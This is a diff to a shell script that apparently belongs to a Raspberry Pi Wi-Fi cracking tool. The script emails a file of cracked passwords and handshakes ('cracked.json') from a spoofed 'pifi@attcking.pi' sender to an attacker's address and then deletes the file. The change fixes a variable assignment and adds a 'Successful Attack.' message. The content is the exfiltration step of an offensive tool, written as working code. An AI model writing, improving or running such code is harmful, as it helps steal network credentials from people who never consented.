@@ -10,10 +10,10 @@ systemctl start NetworkManager
 # Send an email of cracked passwords and handshakes to username@email.com  
 systemctl start postfix
 sleep 30S
-my_address = username@email.com
+my_address=username@email.com
 if [ -f "cracked.json" ]
 then
-    sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
+    sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json -m "Successful Attack."
     rm cracked.json
 else
     sendEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
